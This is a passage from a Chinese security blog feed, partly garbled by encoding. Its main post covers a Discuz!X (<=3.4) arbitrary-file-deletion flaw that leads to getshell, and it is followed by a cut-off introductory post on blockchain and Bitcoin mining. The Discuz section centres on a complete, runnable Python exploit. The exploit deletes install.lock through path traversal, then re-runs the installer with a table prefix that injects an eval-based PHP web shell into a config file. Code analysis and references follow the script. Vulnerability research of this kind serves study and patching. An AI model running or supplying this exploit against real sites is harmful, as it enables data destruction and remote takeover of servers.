class="subst">$key</span>&#x27;]&quot;</span>.<span class="string">&quot; = <span class="subst">$val</span>;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h4><p><a href="http://www.cnblogs.com/LittleHann/p/4317665.html" title="http://www.cnblogs.com/LittleHann/p/4317665.html">http://www.cnblogs.com/LittleHann/p/4317665.html</a></p><h3 id="ä»»æ„æ–‡ä»¶åˆ é™¤åŠå…¶è¡ç”Ÿgetshell">ä»»æ„æ–‡ä»¶åˆ é™¤åŠå…¶è¡ç”Ÿgetshell</h3><p>Discuz!X&lt;=3.4å¯ç”¨ æä¾›å¯å¤ç°ç‰ˆæœ¬çš„dz:<a href="/images/2018/07/DiscuzX.zip">ä¸‹è½½DiscuzX</a> æ¼æ´æœ¬æ¥æ˜¯14å¹´6æœˆè¢«äº¤åˆ°wooyunçš„æ´,åŸæ¥çš„åˆ©ç”¨å·²ç»ä¿®å¤,æ·»åŠ äº†å¯¹å±æ€§çš„formtypeåˆ¤æ–­,ä½†æ˜¯ä¿®å¤ä¸å®Œå…¨å¯¼è‡´å¯ä»¥ç»•è¿‡.</p><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">randstr = <span class="keyword">lambda</span> <span class="built_in">len</span>=<span class="number">5</span>: <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_lowercase) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################</span></span><br><span class="line"><span class="comment">########## Customize these parameters ############</span></span><br><span class="line">target = <span class="string">&#x27;http://localhost/discuzx&#x27;</span></span><br><span class="line"><span class="comment"># login target site first, and copy the cookie here</span></span><br><span class="line">cookie = <span class="string">&quot;UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935%09home.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l%2F6No7r54FCvtNKfp1e5%2FAdz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php%09seccode&quot;</span></span><br><span class="line">shell_password = randstr()</span><br><span class="line">db_host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">db_user = <span class="string">&#x27;&#x27;</span></span><br><span class="line">db_pw = <span class="string">&#x27;&#x27;</span></span><br><span class="line">db_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;/home.php?mod=spacecp&amp;ac=profile&amp;op=base&#x27;</span></span><br><span class="line">url = target + path</span><br><span class="line"></span><br><span class="line">sess.headers.update(&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: url&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sess.proxies.update(&#123;&#x27;http&#x27;: &#x27;socks5://localhost:1080&#x27;&#125;)</span></span><br><span class="line"><span class="comment"># sess.proxies.update(&#123;&#x27;http&#x27;: &#x27;http://localhost:8080&#x27;&#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username=<span class="literal">None</span>, password=<span class="literal">None</span></span>):</span><br><span class="line">    sess.headers.update(&#123;<span class="string">&#x27;Cookie&#x27;</span>: cookie&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_form_hash</span>():</span><br><span class="line">    r = sess.get(url)</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;&quot;member.php\?mod=logging&amp;action=logout&amp;formhash=(.*?)&quot;&#x27;</span>, r.text, re.I)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">formhash, file_to_delete</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;formhash&#x27;</span>: (<span class="literal">None</span>, formhash),</span><br><span class="line">        <span class="string">&#x27;profilesubmit&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;true&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;birthprovince&#x27;</span>: (<span class="literal">None</span>, file_to_delete)</span><br><span class="line">    &#125;</span><br><span class="line">    r = sess.post(url, files=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;parent.show_success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;tamperred successfully&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">formhash, file</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tamper(formhash, file):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    image = <span class="string">b&#x27;iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg==&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;formhash&#x27;</span>: formhash,</span><br><span class="line">        <span class="string">&#x27;profilesubmit&#x27;</span>: <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;birthprovince&#x27;</span>: (<span class="string">&#x27;image.png&#x27;</span>, base64.b64decode(image), <span class="string">&#x27;image/png&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    r = sess.post(url, data=data, files=files)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;parent.show_success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;delete &#123;&#125; successfully&#x27;</span>.<span class="built_in">format</span>(file))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>():</span><br><span class="line">    install_url = target + <span class="string">&#x27;/install/index.php&#x27;</span></span><br><span class="line">    r = sess.get(install_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;å®‰è£…å‘å¯¼&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;install directory not exists&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    table_prefix = <span class="string">&quot;x&#x27;);@eval($_POST[&#123;&#125;]);(&#x27;&quot;</span>.<span class="built_in">format</span>(shell_password)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;step&#x27;</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">&#x27;install_ucenter&#x27;</span>: <span class="string">&#x27;yes&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dbinfo[dbhost]&#x27;</span>: db_host,</span><br><span class="line">        <span class="string">&#x27;dbinfo[dbname]&#x27;</span>: db_name,</span><br><span class="line">        <span class="string">&#x27;dbinfo[dbuser]&#x27;</span>: db_user,</span><br><span class="line">        <span class="string">&#x27;dbinfo[dbpw]&#x27;</span>: db_pw,</span><br><span class="line">        <span class="string">&#x27;dbinfo[tablepre]&#x27;</span>: table_prefix,</span><br><span class="line">        <span class="string">&#x27;dbinfo[adminemail]&#x27;</span>: <span class="string">&#x27;admin@admin.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admininfo[username]&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admininfo[password]&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admininfo[password2]&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admininfo[email]&#x27;</span>: <span class="string">&#x27;admin@admin.com&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r = sess.post(install_url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;å»ºç«‹æ•°æ®è¡¨ CREATE TABLE&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;write shell failed&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;shell: &#123;&#125;/config/config_ucenter.php&#x27;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;password: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(shell_password))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    login()</span><br><span class="line">    form_hash = get_form_hash()</span><br><span class="line">    <span class="keyword">if</span> form_hash:</span><br><span class="line">        delete(form_hash, <span class="string">&#x27;../../../data/install.lock&#x27;</span>)</span><br><span class="line">        getshell()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;failed&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="ä»£ç é€»è¾‘">ä»£ç é€»è¾‘</h4><p>æ ¸å¿ƒé—®é¢˜åœ¨<code>upload/source/include/spacecp/spacecp_profile.php</code> é¦–å…ˆçœ‹åˆ°ç¬¬70è¡Œ <img src="/images/2018/07/dz-5.jpg" alt="blacsheep" /> å½“profileæäº¤çš„æ—¶å€™æ‰§è¡Œä¸‹é¢çš„ä»£ç  ç„¶åç»§ç»­å¾€ä¸‹çœ‹ <img src="/images/2018/07/dz-6.jpg" alt="blacsheep" /> è¿™é‡Œæœ¬æ¥æ²¡æœ‰åˆ¤æ–­,é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥deletefile,ç„¶åéå†çš„æ—¶å€™æŠŠ<code>$space[$key]</code>æ‹¼æ¥åˆ°è·¯å¾„ç„¶åunlinkåˆ æ‰äº†,å…¶ä¸­<code>$space[$key]</code>æ˜¯å¯æ§çš„ åŠ äº†åˆ¤æ–­ä¹‹åä¸è¡Œäº†,å› ä¸ºç”¨æˆ·ä¿¡æ¯å­—æ®µéƒ½æ˜¯éfileç±»å‹,æ²¡åŠæ³• ç„¶è€Œåé¢è¿˜æ˜¯æœ‰æ¼æ´,ä»ç¬¬187è¡Œå¼€å§‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>) &#123;</span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">discuz_upload</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_G</span>[<span class="string">&#x27;cache&#x27;</span>][<span class="string">&#x27;profilesetting&#x27;</span>][<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$setarr</span>[<span class="variable">$key</span>]) &amp;&amp; <span class="variable">$_G</span>[<span class="string">&#x27;cache&#x27;</span>][<span class="string">&#x27;profilesetting&#x27;</span>][<span class="variable">$key</span>][<span class="string">&#x27;needverify&#x27;</span>]) &#123;</span><br><span class="line">                    @<span class="title function_ invoke__">unlink</span>(<span class="title function_ invoke__">getglobal</span>(<span class="string">&#x27;setting/attachdir&#x27;</span>).<span class="string">&#x27;./profile/&#x27;</span>.<span class="variable">$verifyinfo</span>[<span class="string">&#x27;field&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">                    <span class="variable">$verifyarr</span>[<span class="variable">$key</span>] = <span class="variable">$attach</span>[<span class="string">&#x27;attachment&#x27;</span>];</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="title function_ invoke__">getglobal</span>(<span class="string">&#x27;setting/attachdir&#x27;</span>).<span class="string">&#x27;./profile/&#x27;</span>.<span class="variable">$space</span>[<span class="variable">$key</span>]);</span><br><span class="line">                <span class="variable">$setarr</span>[<span class="variable">$key</span>] = <span class="variable">$attach</span>[<span class="string">&#x27;attachment&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªè¦ä¼ ä¸€å¼ å›¾ç‰‡å°±å¯ä»¥ç»•è¿‡,ç„¶åunlinkæ‰åˆ é™¤çš„æ–‡ä»¶ å®˜æ–¹çš„ä¿®å¤æ˜¯åˆ æ‰äº†5ä¸ªunlink...ç®€å•ç²—æš´,ä½†æ˜¯ç¡®å®æœ‰æ•ˆ... é‡è£…çš„è¿‡ç¨‹å°±ä¸åˆ†æäº†,ç®€è€Œè¨€ä¹‹å°±æ˜¯å®‰è£…çš„æ—¶å€™tablepreçš„å€¼å¯ä»¥æ’å…¥åˆ°config.inc.phpæ–‡ä»¶ä¸­,ä»è€Œgetshell</p><h4 id="å‚è€ƒé“¾æ¥-1">å‚è€ƒé“¾æ¥</h4><p><a href="http://blog.nsfocus.net/discuz-arbitrary-file-remove-vulnerability/" title="http://blog.nsfocus.net/discuz-arbitrary-file-remove-vulnerability/">http://blog.nsfocus.net/discuz-arbitrary-file-remove-vulnerability/</a> <a href="https://fafe.me/2017/10/02/discuz-getshell/" title="https://fafe.me/2017/10/02/discuz-getshell/">https://fafe.me/2017/10/02/discuz-getshell/</a> <a href="https://paper.seebug.org/411/" title="https://paper.seebug.org/411/">https://paper.seebug.org/411/</a></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BlockChain&amp;Bitcoinå­¦ä¹ </title>
      <link href="/2018/07/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/07/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>è¿‘æœŸä¹Ÿæ²¡å•¥äº‹æƒ…,å‡†å¤‡å¤ç°ä¸€ä¸‹ä¹‹å‰çš„é¢˜ç›®,å‘ç°æœ‰ä¸¤é“åŒºå—é“¾çš„é¢˜,è¿™é‡Œå…ˆå­¦ä¹ ä¸€ä¸‹åŒºå—é“¾,ä¹‹åå†å†™é¢˜ç›®çš„è§£ç­”</p><h2 id="åŒºå—é“¾">åŒºå—é“¾</h2><h3 id="åŒºå—é“¾çš„æœ¬è´¨">1.åŒºå—é“¾çš„æœ¬è´¨</h3><p>é¦–å…ˆçœ‹æ¥,åŒºå—é“¾æ˜¯ä»€ä¹ˆ? <strong>åŒºå—é“¾æ˜¯ä¸€ç§ç‰¹æ®Šçš„åˆ†å¸ƒå¼æ•°æ®åº“</strong> åŒºå—é“¾çš„ä½œç”¨æ˜¯å­˜å‚¨ä¿¡æ¯,ä»»ä½•éœ€è¦ä¿å­˜çš„ä¿¡æ¯éƒ½å¯ä»¥å†™å…¥,ä¹Ÿå¯ä»¥ä»ä¸­è¯»å–,æ‰€ä»¥è¯´æ˜¯æ•°æ®åº“ ä»»ä½•äººéƒ½å¯ä»¥æ¶è®¾æœåŠ¡å™¨åŠ å…¥åŒºå—é“¾ç½‘ç»œ,æˆä¸ºä¸€ä¸ªèŠ‚ç‚¹ã€‚ åŒºå—é“¾çš„ä¸€ä¸ªå¾ˆå¤§çš„ç‰¹ç‚¹:<strong>æ²¡æœ‰ä¸­å¿ƒ</strong> æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æ˜¯å¹³ç­‰çš„,éƒ½ä¿å­˜ç€æ•´ä¸ªæ•°æ®åº“,ä½ å¯ä»¥å‘ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹å†™å…¥æˆ–è¯»å–æ•°æ®,æ‰€æœ‰èŠ‚ç‚¹æœ€åéƒ½ä¼šåŒæ­¥,ä¿è¯åŒºå—é“¾ä¸€è‡´ã€‚</p><h3 id="åŒºå—">2.åŒºå—</h3><p>åŒºå—é“¾ç”±ä¸€ä¸ªä¸ªåŒºå—ç»„æˆ,åŒºå—å°±å¾ˆæƒ³æ•°æ®åº“çš„è®°å½•,æ¯æ¬¡å†™å…¥æ•°æ®å°±æ˜¯åˆ›å»ºä¸€ä¸ªåŒºå—ã€‚ æ¯ä¸ªåŒºå—åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†</p><blockquote><p>1.åŒºå—å¤´(Head):è®°å½•å½“å‰åŒºå—çš„ç‰¹å¾å€¼ 2.åŒºå—ä½“(Body):å®é™…æ•°æ®</p></blockquote><p>åŒºå—å¤´åŒ…å«å¾ˆå¤šå½“å‰åŒºå—çš„ç‰¹å¾å€¼</p><blockquote><p>1.ç”Ÿæˆæ—¶é—´ 2.å®é™…æ•°æ®çš„hash 3.ä¸Šä¸€ä¸ªåŒºå—çš„hash ...</p></blockquote><p>å› æ­¤,æœ‰ä¸¤ä¸ªæ¨è®º:</p><blockquote><p>1.æ¯ä¸ªåŒºå—é“¾çš„hashéƒ½ä¸ä¸€æ ·,å¯ä»¥é€šè¿‡hashæ ‡è¯†åŒºå— 2.å¦‚æœåŒºå—çš„å†…å®¹å˜äº†,å®ƒçš„hashä¸€å®šä¼šå˜</p></blockquote><h3 id="hashçš„ä¸å¯ä¿®æ”¹">3.hashçš„ä¸å¯ä¿®æ”¹</h3><p>åŒºå—å’Œhashä¸€ä¸€å¯¹åº”,æ¯ä¸ªåŒºå—çš„hashéƒ½æ˜¯é’ˆå¯¹åŒºå—å¤´è®¡ç®—çš„,ä¹Ÿå°±æ˜¯æŠŠåŒºå—å¤´çš„å„é¡¹å€¼æŒ‰é¡ºåºè¿æ¥ç»„æˆä¸€ä¸ªå¾ˆé•¿çš„å­—ç¬¦ä¸²,ç„¶åå¯¹è¿™ä¸ªå­—ç¬¦ä¸²è®¡ç®—hash</p><blockquote><p>Hash=SHA256(åŒºå—å¤´)</p></blockquote><p>å…¬å¼æ³¨æ„è¿›è¡Œsha256è¿ç®—çš„åªæ˜¯å¤´éƒ¨,å¹¶ä¸åŒ…æ‹¬å†…å®¹,ä¹Ÿå°±æ˜¯hashç”±åŒºå—å¤´å”¯ä¸€ç¡®å®š å‰é¢è¯´è¿‡,åŒºå—å¤´åŒ…å«å¾ˆå¤šä¸œè¥¿,å…¶ä¸­æœ‰å½“å‰åŒºå—ä½“çš„hash,ä¹Ÿæœ‰ä¸Šä¸€åŒºå—çš„åŒºå—çš„hash,é‚£ä¹ˆå°±æ˜¯è¯´,å¦‚æœå½“å‰åŒºå—ä½“çš„å†…å®¹å˜äº†,æˆ–è€…ä¸Šä¸€åŒºå—çš„hashå˜äº†,é‚£ä¹ˆå°±ä¼šå¯¼è‡´å½“å‰åŒºå—çš„hashæ”¹å˜ è¿™ä¸€ç‚¹å¯¹åŒºå—é“¾æœ‰é‡å¤§æ„ä¹‰ã€‚å¦‚æœæœ‰äººä¿®æ”¹äº†ä¸€ä¸ªåŒºå—,è¯¥åŒºå—çš„hashå°±å˜äº†,ä¸ºäº†è®©åé¢çš„åŒºå—èƒ½æ‰¾åˆ°å®ƒ,é‚£ä¹ˆè¿™ä¸ªäººè¿˜å¿…é¡»ä¿®æ”¹åé¢çš„æ‰€æœ‰åŒºå—,å¦åˆ™è¢«æ”¹æ‰çš„åŒºå—å°±è„±ç¦»åŒºå—é“¾äº†ã€‚ è€Œè¿™å°±æ˜¯åé¢è¦è®¨è®ºçš„,å› ä¸ºhashçš„è®¡ç®—å¾ˆè€—æ—¶,çŸ­æ—¶é—´ä¿®æ”¹å¤šä¸ªåŒºå—å‡ ä¹ä¸å¯èƒ½å‘ç”Ÿ,é™¤éæœ‰äºº<strong>æŒæ¡äº†å…¨ç½‘51%ä»¥ä¸Šçš„è®¡ç®—èƒ½åŠ›</strong> è¿™æ˜¯è¿™ç§æœºåˆ¶,åŒºå—é“¾ä¿è¯äº†è‡ªèº«çš„å¯é æ€§,æ•°æ®ä¸€æ—¦å†™å…¥å°±æ— æ³•è¢«ç¯¡æ”¹,å°±åƒå†å²ä¸€æ ·,æ— æ³•å†è¿›è¡Œæ”¹å˜,æ¯ä¸ªåŒºå—è¿æ¥ä¸€ä¸ªåŒºå—,ä¹Ÿå°±æ˜¯åŒºå—é“¾çš„åå­—çš„ç”±æ¥ã€‚</p><h3 id="é‡‡çŸ¿">4.é‡‡çŸ¿</h3><p>ç”±äºè¦ä¿è¯èŠ‚ç‚¹ä¹‹é—´çš„åŒæ­¥,æ‰€ä»¥æ–°çš„åŒºå—çš„æ·»åŠ é€Ÿåº¦ä¸èƒ½å¤ªå¿«ã€‚è¯•æƒ³ä¸€ä¸‹,ä½ åˆšåˆšåŒæ­¥äº†ä¸€ä¸ªåŒºå—,å‡†å¤‡åŸºäºå®ƒç”Ÿæˆä¸‹ä¸€ä¸ªåŒºå—,ä½†è¿™æ—¶åˆ«çš„èŠ‚ç‚¹åˆæœ‰æ–°åŒºå—ç”Ÿæˆ,ä½ ä¸å¾—ä¸æ”¾å¼ƒåšäº†ä¸€åŠçš„è®¡ç®—,å†å»åŒæ­¥,å› ä¸ºæ¯ä¸ªåŒºå—çš„åé¢åªèƒ½è·Ÿç€ä¸€ä¸ªåŒºå—,ä½ æ°¸è¿œåªèƒ½åœ¨æœ€æ–°çš„åŒºå—åé¢,ç”Ÿæˆä¸‹ä¸€ä¸ªåŒºå—ã€‚æ‰€ä»¥,ä½ åˆ«æ— é€‰æ‹©,ä¸€å¬åˆ°ä¿¡å·,å°±å¿…é¡»ç«‹åˆ»åŒæ­¥ã€‚ ä¸ºäº†å°½åŠ›é¿å…è¿™ç§æƒ…å†µ,åŒºå—é“¾çš„å‘æ˜è€…ä¸­æœ¬èª(å‡å)æ•…æ„è®©æ·»åŠ æ–°åŒºå—å˜å¾—å›°éš¾ã€‚ä»–çš„è®¾è®¡æ˜¯å¹³å‡æ¯10åˆ†é’Ÿ,å…¨ç½‘æ‰èƒ½ç”Ÿæˆä¸€ä¸ªæ–°åŒºå—,ä¸€ä¸ªå°æ—¶å°±6ä¸ª è€Œè¿™ä¸ªé€Ÿåº¦å¹¶ä¸æ˜¯é€šè¿‡å‘½ä»¤å®ç°çš„,è€Œæ˜¯æ•…æ„è®¾äº†æµ·é‡çš„è®¡ç®—ã€‚ä¹Ÿå°±æ˜¯è¯´,åªæœ‰é€šè¿‡æå…¶å¤§é‡çš„è®¡ç®—,æ‰èƒ½å¾—åˆ°å½“å‰åŒºå—çš„æœ‰æ•ˆhash,ä»è€ŒæŠŠæ–°åŒºå¿«æ·»åŠ åˆ°åŒºå—é“¾,è®¡ç®—é‡å¤ªå¤§,æ‰€ä»¥å¿«ä¸èµ·æ¥ è€Œè¿™ä¸ªè®¡ç®—æœ‰æ•ˆhashçš„è¿‡ç¨‹å°±å«é‡‡çŸ¿,æ“çºµçŸ¿æœºçš„äººå°±å«çŸ¿å·¥</p><h3 id="éš¾åº¦ç³»æ•°">5.éš¾åº¦ç³»æ•°</h3><p>éš¾åº¦ç³»æ•°å†³å®šäº†ä½ ç®—å‡ºæ¥çš„hashæ˜¯å¦æ˜¯æœ‰æ•ˆhash,ä¹Ÿå°±æ˜¯è¿™ä¸ªå¯¼è‡´äº†å¹³å‡æ¯10åˆ†é’Ÿå…¨ç½‘åªèƒ½äº§ç”Ÿä¸€ä¸ªåŒºå—. 